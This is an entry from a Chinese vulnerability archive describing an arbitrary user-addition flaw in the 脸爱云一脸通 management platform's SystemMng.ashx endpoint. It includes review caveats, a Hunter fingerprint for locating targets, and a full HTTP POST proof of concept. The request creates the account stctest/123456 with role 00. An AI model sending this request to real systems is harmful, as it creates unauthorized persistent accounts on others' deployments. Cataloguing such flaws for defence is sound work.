---
source: "wy876 漏洞文库"
title: "脸爱云一脸通智慧管理平台 SystemMng addOperators任意用户添加"
product: "脸爱云一脸通智慧管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，有效会话/角色00含义未知"
prerequisites: "请求带ASP.NET会话"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/txdammysmosfwe7o"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%84%B8%E7%88%B1%E4%BA%91/%E8%84%B8%E7%88%B1%E4%BA%91%E4%B8%80%E8%84%B8%E9%80%9A%E6%99%BA%E6%85%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0SystemMng%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.icon=="
hunter: "web.icon==\"4f0be080512ee0b45fc90ff894b6ba60\""
id: "vw-e79e874c0a3e27fdfb1c780a"
entity_id: "ve-e79e874c0a3e27fdfb1c780a"
schema_version: "1"
---

# 脸爱云一脸通智慧管理平台 SystemMng addOperators任意用户添加

## 条目说明

- 对象与具体问题：脸爱云一脸通智慧管理平台；SystemMng addOperators任意用户添加
- 版本、配置及部署条件：版本未知，有效会话/角色00含义未知
- 认证与权限前提：请求带ASP.NET会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 任意添加声称未证明匿名，需对照未登录会话；role00权限不得直接等同管理员
- 请求创建持久账户及固定弱密码，需标状态改变与清理；无响应或登录返回
- 编码请选择字段是UI残值，是否必填不明；Hunter错入fofa、修复缺

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台SystemMng存在任意用户添加漏洞。攻击者可通过该漏洞获取应用权限。

## 二、影响版本
+ 脸爱云一脸通智慧管理平台

## 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征


## 四、漏洞复现
```http
POST /SystemMng.ashx HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=w**********************y
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

operatorName=stctest&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
```

> 请求长度说明：原资料 Content-Length 为 175；静态长度已移除，应由客户端根据最终请求体的字节数生成。


使用添加的账号`stctest/123456`登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/txdammysmosfwe7o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
